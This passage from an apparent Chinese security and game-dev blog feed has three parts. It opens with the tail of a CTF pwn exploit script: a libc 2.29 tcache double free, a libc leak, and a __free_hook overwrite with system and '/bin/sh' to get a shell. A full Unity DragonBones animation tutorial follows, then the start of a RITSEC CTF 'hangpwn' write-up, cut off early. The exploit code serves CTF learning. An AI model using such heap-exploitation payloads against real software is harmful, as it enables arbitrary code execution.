class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">free_0(<span class="number">2</span>) <span class="comment">#让0x100与0xe0合并制造出unsertedbin 效果</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">'1'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'xx'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">''</span>)</span><br><span class="line">show(<span class="number">8</span>)<span class="comment">#泄露libc地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#传统劫持tache，任意地址写</span></span><br><span class="line">addr=(u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)))</span><br><span class="line">log.info(hex(addr))</span><br><span class="line">malloc_hook=addr+<span class="number">0x26</span></span><br><span class="line">log.info(hex(malloc_hook))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">x=finder(<span class="string">'__malloc_hook'</span>,malloc_hook)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">'t'</span>*<span class="number">0xe0</span>+p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">add(<span class="number">3</span>,p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;在2.29版本上的libc中，由于 tcache 加入了 key 值来进行 double free 检测，以至于在旧版本时的直接进行 double free 变的无效。</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>在unity中使用DragonBones骨骼的方法</title>
    <link href="lexsd6.github.io/2022/05/16/%E5%9C%A8unity%E4%B8%AD%E4%BD%BF%E7%94%A8DragonBones%E9%AA%A8%E9%AA%BC/"/>
    <id>lexsd6.github.io/2022/05/16/%E5%9C%A8unity%E4%B8%AD%E4%BD%BF%E7%94%A8DragonBones%E9%AA%A8%E9%AA%BC/</id>
    <published>2022-05-16T13:31:49.983Z</published>
    <updated>2022-05-21T12:47:12.472Z</updated>
    
    <content type="html"><![CDATA[<p>最近跑路的事情稳了，又拿出2019年设计的小游戏草案在那里改。找文章发现DragonBones骨骼可以用来unity中使用。但项目需求使用时，踩了很多坑。<a id="more"></a></p><h2 id="导入插件"><a href="#导入插件" class="headerlink" title="导入插件"></a>导入插件</h2><p>在github(<a href="https://github.com/DragonBones/DragonBonesCSharp" target="_blank" rel="noopener">https://github.com/DragonBones/DragonBonesCSharp</a>) 下载插件.</p><p>然后：</p><ol><li>创建一个 Unity 项目或使用上述示例项目。</li><li>分别复制 <a href="https://github.com/DragonBones/DragonBonesCSharp/blob/master/DragonBones/src" target="_blank" rel="noopener">DragonBones 公共库源码</a>、<a href="https://github.com/DragonBones/DragonBonesCSharp/blob/master/Unity/src" target="_blank" rel="noopener">DragonBones Unity 库源码</a>、<a href="https://github.com/DragonBones/DragonBonesCSharp/blob/master/3rdParty" target="_blank" rel="noopener">第三方库源码</a> 中的所有文件夹和文件到项目的 Assets/Scripts 文件夹下。</li><li>运行项目。</li></ol><p>确保项目结构如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Your project</span><br><span class="line">    |-- Assets</span><br><span class="line">        |-- DragonBones</span><br><span class="line">            |-- Demos (如果不需要，可以删除。)</span><br><span class="line">            |-- Scripts        </span><br><span class="line">                |-- 3rdParty</span><br><span class="line">                |-- animation</span><br><span class="line">                |-- armature</span><br><span class="line">                |-- ...</span><br><span class="line">                |-- unity</span><br><span class="line">                |-- ...</span><br><span class="line">            |-- Editor</span><br><span class="line">            |-- Resources</span><br><span class="line">                |-- Shaders files</span><br><span class="line">                |-- ...</span><br><span class="line">            |-- ...</span><br><span class="line">        |-- Resources</span><br><span class="line">            |-- DragonBonesData files</span><br><span class="line">            |-- ...</span><br><span class="line">        |-- Scripts</span><br><span class="line">        |-- ...</span><br><span class="line">    |-- ...</span><br><span class="line">&#96;&#96;&#96;-- ...</span><br></pre></td></tr></table></figure><h2 id="素材导入"><a href="#素材导入" class="headerlink" title="素材导入"></a>素材导入</h2><h3 id="图像界面导入"><a href="#图像界面导入" class="headerlink" title="图像界面导入"></a>图像界面导入</h3><p>unity图像界面导入DragonBones骨骼比较简单。分为Data数据导入和直接法。</p><h4 id="直接导入"><a href="#直接导入" class="headerlink" title="直接导入"></a>直接导入</h4><p>在插件导入后，我们就点击右键ske文件，点击DragonBones中<code>Armature Object</code>,可以生成DragonBones骨骼动画对象。</p><p><img src="image-20220520110016570.png" alt="image-20220520110016570"></p><h4 id="Data数据"><a href="#Data数据" class="headerlink" title="Data数据"></a>Data数据</h4><p>在插件导入后，我们就点击右键ske文件，点击DragonBones中<code>Create Unity Data</code>,可以生成data文件。</p><p><img src="image-20220520101926214.png" alt="image-20220520101926214"></p><p>在把文件拖入DragonBones对象里。</p><p><img src="image-20220520105643528.png" alt="image-20220520105643528"></p><h3 id="代码导入"><a href="#代码导入" class="headerlink" title="代码导入"></a>代码导入</h3><p>参照官方demo教程–<code>HelloDragonBones.cs</code>改动的，纯代码导入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">using System.Collections;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using UnityEngine;</span><br><span class="line">using DragonBones;</span><br><span class="line">public class testal : MonoBehaviour&#x2F;&#x2F;BaseDemo &#x2F;&#x2F;MonoBehaviour</span><br><span class="line">&#123;  </span><br><span class="line">    private UnityDragonBonesData dragonBoneData;</span><br><span class="line">    &#x2F;&#x2F; Update is called once per frame</span><br><span class="line">    &#x2F;&#x2F; Start is called before the first frame update</span><br><span class="line">    &#x2F;&#x2F; protected override void OnStart()</span><br><span class="line">    void Start()</span><br><span class="line">    &#123;</span><br><span class="line">        dragonBoneData&#x3D;UnityEditor.AssetDatabase.LoadAssetAtPath&lt;UnityDragonBonesData&gt;(&quot;Assets&#x2F;ylw&#x2F;xlw_Data.asset&quot;);</span><br><span class="line">        &#x2F;&#x2F; 1.Load and parse data</span><br><span class="line">       &#x2F;&#x2F; Debug.Log(dragonBoneData.dragonBonesJSON);</span><br><span class="line">        if (true)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; Scheme 1: Load UnityDragonBonesData</span><br><span class="line">            UnityFactory.factory.LoadData(this.dragonBoneData);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; Scheme 2: Load JsonData in Resources</span><br><span class="line">             &#x2F;&#x2F;UnityFactory.factory.LoadDragonBonesData(&quot;&#x2F;Assets&#x2F;ylw&#x2F;xlw_ske.json&quot;);</span><br><span class="line">             &#x2F;&#x2F;UnityFactory.factory.LoadTextureAtlasData(&quot;&#x2F;Assets&#x2F;ylw&#x2F;xlw_tex.json&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 2.Build armature</span><br><span class="line">        var armatureComponent &#x3D; UnityFactory.factory.BuildArmatureComponent(&quot;animx&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 3.Play animation</span><br><span class="line">        armatureComponent.animation.Play(&quot;stand&quot;);</span><br><span class="line">       </span><br><span class="line">        &#x2F;&#x2F; Set name</span><br><span class="line">        armatureComponent.name &#x3D; &quot;dynamic_mecha_1002_101d&quot;;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Set position.</span><br><span class="line"></span><br><span class="line">        armatureComponent.transform.localPosition &#x3D; new Vector3(3.0f, -1.5f, 1.0f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Update is called once per frame</span><br><span class="line">    void Update()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里要注意的是<code>UnityFactory.factory.BuildArmatureComponent()</code>函数的参数与ske文件中的<code>armature</code>属性里的<code>name</code>的值相关，两者要一致。</p><p>同时，如果是<strong>高版本素材</strong>推荐用<strong>scheme1</strong>导入，<strong>低版本</strong>用<strong>scheme2</strong>。否则，代码导入后有蜜汁bug。</p><p>另外代码导入时，确保正确生成了mat文件，否则也有蜜汁bug。官方代码里先读取文件再判断是否生成orw。。。。</p><h2 id="用代码获得骨骼动画对象"><a href="#用代码获得骨骼动画对象" class="headerlink" title="用代码获得骨骼动画对象"></a>用代码获得骨骼动画对象</h2><p>我们在导入unity后,我们可以通过UnityArmatureComponent控件来管理我们DragonBones骨骼动画。</p><p>我们可以GETcomponent来获取我们的DragonBones骨骼动画对象：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public DragonBones.UnityArmatureComponent anmi;</span><br><span class="line">anmi&#x3D;xxx.GetComponent&lt;DragonBones.UnityArmatureComponent&gt;();</span><br></pre></td></tr></table></figure><p>也可以直接使用拖拽法</p><p><img src="image-20220517113029077.png" alt="image-20220517113029077"></p><h2 id="用代码控制骨骼动画播放"><a href="#用代码控制骨骼动画播放" class="headerlink" title="用代码控制骨骼动画播放"></a>用代码控制骨骼动画播放</h2><p>官方提供的获得控制骨骼动画播放与播放状态属性的API，这些与播放相关的API多数放在animation属性下。</p><p>具体API简略整理如下：</p><h3 id="通过指定的动画配置来播放动画"><a href="#通过指定的动画配置来播放动画" class="headerlink" title="通过指定的动画配置来播放动画"></a>通过指定的动画配置来播放动画</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState PlayConfig(AnimationConfig animationConfig)</span><br></pre></td></tr></table></figure><p> 通过指定的动画配置来播放动画。 该 API 仍在实验阶段，使用时可能遭遇 bug 或稳定性或兼容性问题。</p><p>参数：</p><p><code>animationConfig</code>：是指动画配置。</p><h3 id="播放指定动画"><a href="#播放指定动画" class="headerlink" title="播放指定动画"></a>播放指定动画</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState Play(string animationName &#x3D; null, int playTimes &#x3D; -1)</span><br></pre></td></tr></table></figure><p>播放指定动画，并设置循环次数。</p><p>参数:</p><p><code>animationName</code>:运行动画名称。</p><p><code>playTimes</code>:循环次数  [-1: 使用动画数据默认值, 0: 无限循环播放, [1~N]: 循环播放 N 次] （默认: -1）示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">armature.animation.play(&quot;walk&quot;);</span><br></pre></td></tr></table></figure><h3 id="淡入播放指定的动画"><a href="#淡入播放指定的动画" class="headerlink" title="淡入播放指定的动画"></a>淡入播放指定的动画</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState FadeIn(string animationName, float fadeInTime &#x3D; -1.0f, int playTimes &#x3D; -1,</span><br><span class="line">                                  int layer &#x3D; 0, string group &#x3D; null,</span><br><span class="line">                                  AnimationFadeOutMode fadeOutMode &#x3D; AnimationFadeOutMode.SameLayerAndGroup)</span><br></pre></td></tr></table></figure><p><code>FadeIn()</code>淡入播放指定的动画。</p><p>参数：</p><p><code>animationName</code>：动画数据名称。</p><p> <code>fadeInTime</code>:淡入时间。 [-1: 使用动画数据默认值, [0~N]: 淡入时间 (以秒为单位)] （默认: -1）</p><p><code>playTimes</code>: 播放次数。 [-1: 使用动画数据默认值, 0: 无限循环播放, [1~N]: 循环播放 N 次] （默认: -1）</p><p><code>layer</code>:混合图层，图层高的动画状态会优先获取混合权重，当混合权重分配总和超过 1.0 时，剩余的动画状态将不能再获得权重分配。 （默认: 0）</p><p><code>group</code> 混合组名称，该属性通常用来指定多个动画状态混合时的相互替换关系。 （默认: null）</p><p><code>fadeOutMode</code>:淡出模式，该属性通常用来指定多个动画状态混合时的相互替换模式。 （默认: <code>AnimationFadeOutMode.SameLayerAndGroup</code>）</p><p>返回值：</p><p>播放的状态。</p><p>PS:淡出模式的具体模式有:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">AnimationFadeOutMode.None &#x2F;&#x2F;不淡出任何的动画状态，值同等于0   </span><br><span class="line">    </span><br><span class="line">AnimationFadeOutMode.SameLayer &#x2F;&#x2F;淡出同层的动画状态，值同等于1</span><br><span class="line">    </span><br><span class="line">AnimationFadeOutMode.SameGroup&#x2F;&#x2F; 淡出同组的动画状态，值同等于2</span><br><span class="line"></span><br><span class="line">AnimationFadeOutMode.SameLayerAndGroup &#x2F;&#x2F;淡出同层并且同组的动画状态，值同等于3</span><br><span class="line"></span><br><span class="line">AnimationFadeOutMode.ALL&#x2F;&#x2F;淡出所有的动画状态，值同等于4</span><br><span class="line"></span><br><span class="line">AnimationFadeOutMode.Single &#x2F;&#x2F; 不替换同名的动画状态，值同等于5</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">armature.animation.fadeIn(&quot;walk&quot;, 0.3, 0, 0, &quot;normalGroup&quot;).resetToPose &#x3D; false;</span><br><span class="line">armature.animation.fadeIn(&quot;attack&quot;, 0.3, 1, 0, &quot;attackGroup&quot;).resetToPose &#x3D; false;</span><br></pre></td></tr></table></figure><h3 id="指定时间开始播放指定动画"><a href="#指定时间开始播放指定动画" class="headerlink" title="指定时间开始播放指定动画"></a>指定时间开始播放指定动画</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState GotoAndPlayByTime(string animationName, float time &#x3D; 0.0f, int playTimes &#x3D; -1)</span><br></pre></td></tr></table></figure><p><code>GotoAndPlayByTime()</code>-指定时间开始播放.</p><p>参数：</p><p><code>animationName</code>- 动画数据名称。</p><p>  <code>time</code>- 播放开始的时间。 (以秒为单位)</p><p><code>playTimes</code>- 循环播放次数。 [-1: 使用动画数据默认值, 0: 无限循环播放, [1~N]: 循环播放 N 次] （默认: -1）</p><p>返回值：</p><p>播放的动画状态。</p><h3 id="指定帧开始播放指定动画"><a href="#指定帧开始播放指定动画" class="headerlink" title="指定帧开始播放指定动画"></a>指定帧开始播放指定动画</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState GotoAndPlayByFrame(string animationName, uint frame &#x3D; 0, int playTimes &#x3D; -1)</span><br></pre></td></tr></table></figure><p><code>GotoAndPlayByFrame</code>从指定帧开始播放指定的动画</p><p>参数:</p><p><code>animationName</code>- 动画数据名称。</p><p><code>frame</code>- 播放开始的帧数。</p><p><code>playTimes</code>- 播放次数。 [-1: 使用动画数据默认值, 0: 无限循环播放, [1~N]: 循环播放 N 次] （默认: -1）</p><p>返回值：</p><p>播放的动画状态。</p><h3 id="指定进度开始播放指定的动画"><a href="#指定进度开始播放指定的动画" class="headerlink" title="指定进度开始播放指定的动画"></a>指定进度开始播放指定的动画</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState GotoAndPlayByProgress(string animationName, float progress &#x3D; 0.0f, int playTimes &#x3D; -1)</span><br></pre></td></tr></table></figure><p><code>GotoAndPlayByProgress</code>指定进度开始播放指定的动画。</p><p>参数：</p><p><code>animationName</code> 动画数据名称。</p><p><code>progress</code>- 开始播放的进度。</p><p><code>playTimes</code>- 播放次数。 [-1: 使用动画数据默认值, 0: 无限循环播放, [1~N]: 循环播放 N 次] （默认: -1）</p><p>返回值：</p><p>returns-播放的动画状态。</p><h3 id="指定时间停止指定动画播放"><a href="#指定时间停止指定动画播放" class="headerlink" title="指定时间停止指定动画播放"></a>指定时间停止指定动画播放</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState GotoAndStopByTime(string animationName, float time &#x3D; 0.0f)</span><br></pre></td></tr></table></figure><p>在指定时间停止指定动画播放。</p><p>参数：</p><p><code>animationName</code>- 动画数据名称。</p><p><code>time</code>- 停止的时间。 (以秒为单位)</p><p>返回值：播放的动画状态。</p><h3 id="指定帧停止指定动画的播放"><a href="#指定帧停止指定动画的播放" class="headerlink" title="指定帧停止指定动画的播放"></a>指定帧停止指定动画的播放</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState GotoAndStopByFrame(string animationName, uint frame &#x3D; 0)</span><br></pre></td></tr></table></figure><p>在指定帧停止指定动画的播放</p><p>参数：</p><p><code>animationName</code>- 动画数据名称.</p><p><code>frame</code>- 停止的帧数。</p><p> 返回值：</p><p>播放的动画状态。</p><h3 id="指定的进度停止指定的动画播放"><a href="#指定的进度停止指定的动画播放" class="headerlink" title="指定的进度停止指定的动画播放"></a>指定的进度停止指定的动画播放</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState GotoAndStopByProgress(string animationName, float progress &#x3D; 0.0f)</span><br></pre></td></tr></table></figure><p>指定的进度停止指定的动画播放</p><p>参数：</p><p><code>animationName</code>- 动画数据名称。</p><p><code>progress</code>- 停止进度。</p><p>返回状态：播放的动画状态。</p><h3 id="获取指定的动画状态"><a href="#获取指定的动画状态" class="headerlink" title="获取指定的动画状态"></a>获取指定的动画状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState GetState(string animationName)</span><br></pre></td></tr></table></figure><p>获取指定的动画状态</p><p>参数：</p><p><code>animationName</code>- 动画状态名称。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">armature.animation.play(&quot;walk&quot;);</span><br><span class="line">et walkState &#x3D; armature.animation.getState(&quot;walk&quot;);</span><br><span class="line">walkState.timeScale &#x3D; 0.5;</span><br></pre></td></tr></table></figure><h3 id="检查是否包含指定的动画数据"><a href="#检查是否包含指定的动画数据" class="headerlink" title="检查是否包含指定的动画数据"></a>检查是否包含指定的动画数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public bool HasAnimation(string animationName)</span><br><span class="line">        &#123;</span><br><span class="line">            return this._animations.ContainsKey(animationName);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><code>HasAnimation()</code>检查是否包含指定的动画数据</p><p>参数：</p><p><code>animationName</code>- 动画数据名称。</p><h3 id="获取所有的动画状态"><a href="#获取所有的动画状态" class="headerlink" title="获取所有的动画状态"></a>获取所有的动画状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public List&lt;AnimationState&gt; GetStates()</span><br></pre></td></tr></table></figure><p><code>GetStates()</code> 获取所有的动画状态.</p><h3 id="检查是否有动画状态正在播放"><a href="#检查是否有动画状态正在播放" class="headerlink" title="检查是否有动画状态正在播放"></a>检查是否有动画状态正在播放</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public bool isPlaying</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">armature.animation.isPlaying</span><br></pre></td></tr></table></figure><p>为True  表在播放，为flase则未在播放。</p><h3 id="检查是否所有的动画状态均已播放完毕"><a href="#检查是否所有的动画状态均已播放完毕" class="headerlink" title="检查是否所有的动画状态均已播放完毕"></a>检查是否所有的动画状态均已播放完毕</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public bool isCompleted</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">armature.animation.isCompleted</span><br></pre></td></tr></table></figure><h3 id="上一个播放的动画状态名称"><a href="#上一个播放的动画状态名称" class="headerlink" title="上一个播放的动画状态名称"></a>上一个播放的动画状态名称</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public string lastAnimationName</span><br><span class="line">&#x2F;&#x2F; 示例：</span><br><span class="line">armature.animation.isCompleted</span><br></pre></td></tr></table></figure><h3 id="所有动画数据的名称"><a href="#所有动画数据的名称" class="headerlink" title="所有动画数据的名称"></a>所有动画数据的名称</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public List&lt;string&gt; animationNames</span><br></pre></td></tr></table></figure><h3 id="所有的动画数据"><a href="#所有的动画数据" class="headerlink" title="所有的动画数据"></a>所有的动画数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public Dictionary&lt;string, AnimationData&gt; animations</span><br></pre></td></tr></table></figure><p>一个可以快速使用的动画配置实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationConfig animationConfig</span><br></pre></td></tr></table></figure><h3 id="上一个播放的动画状态"><a href="#上一个播放的动画状态" class="headerlink" title="上一个播放的动画状态"></a>上一个播放的动画状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState lastAnimationState</span><br></pre></td></tr></table></figure><h2 id="替换骨骼动画"><a href="#替换骨骼动画" class="headerlink" title="替换骨骼动画"></a>替换骨骼动画</h2><p>Assets\DragonBones\Editor\UnityEditor.cs  里用执行替换骨骼动画的函数–<code>ChangeDragonBonesData</code></p><p>拷贝<code>Assets\DragonBones\Editor\UnityEditor.cs</code>到目录<code>Assets\DragonBones\Scripts\animation\</code></p><p>​    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static bool ChangeDragonBonesData(UnityArmatureComponent _armatureComponent, TextAsset dragonBoneJSON)</span><br></pre></td></tr></table></figure><p><code>ChangeDragonBonesData</code>的一个参数时要替换骨骼与动画<code>UnityArmatureComponent</code>控件，二个是替换成的dragonBoneJSON数据。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">var anmi2&#x3D;xxx.GetComponent&lt;DragonBones.UnityArmatureComponent&gt;();</span><br><span class="line">UnityDragonBonesData SSS;</span><br><span class="line">UnityFactory.factory.Clear(true); &#x2F;&#x2F;清楚缓存</span><br><span class="line">SSS&#x3D;UnityEditor.AssetDatabase.LoadAssetAtPath&lt;UnityDragonBonesData&gt;(&quot;Assets&#x2F;kwww&#x2F;ssss_Data.asset&quot;);</span><br><span class="line">DragonBones.UnityEditor.ChangeDragonBonesData(anmi2,SSS.dragonBonesJSON);</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://github.com/DragonBones/DragonBonesCSharp" target="_blank" rel="noopener">https://github.com/DragonBones/DragonBonesCSharp</a></p><p><a href="https://github.com/DragonBones/DragonBonesCSharp/blob/master/README-zh_CN.md" target="_blank" rel="noopener">https://github.com/DragonBones/DragonBonesCSharp/blob/master/README-zh_CN.md</a></p><p><a href="https://github.com/DragonBones/DragonBonesCSharp/blob/master/Unity/README-zh_CN.md" target="_blank" rel="noopener">https://github.com/DragonBones/DragonBonesCSharp/blob/master/Unity/README-zh_CN.md</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近跑路的事情稳了，又拿出2019年设计的小游戏草案在那里改。找文章发现DragonBones骨骼可以用来unity中使用。但项目需求使用时，踩了很多坑。</summary>
    
    
    
    <category term="unity" scheme="lexsd6.github.io/categories/unity/"/>
    
    
    <category term="DragonBones" scheme="lexsd6.github.io/tags/DragonBones/"/>
    
    <category term="c#" scheme="lexsd6.github.io/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>RITSEC-CTF-2022-PWN-hangpwn</title>
    <link href="lexsd6.github.io/2022/04/07/RITSEC-CTF-2022%20-PWN-hangpwn/"/>
    <id>lexsd6.github.io/2022/04/07/RITSEC-CTF-2022%20-PWN-hangpwn/</id>
    <published>2022-04-07T13:29:49.630Z</published>
    <updated>2022-04-07T15:39:47.867Z</updated>
    
    <content type="html"><![CDATA[<p>这个比赛很迷惑。感觉大多题很水但是ctftime比重高。这是其中一个有点意思的题<a id="more"></a>。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>题目没有开启PIE和canary。减少了不小负担。</p><p>题目的主要功能很简单就是猜测字符，主要代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 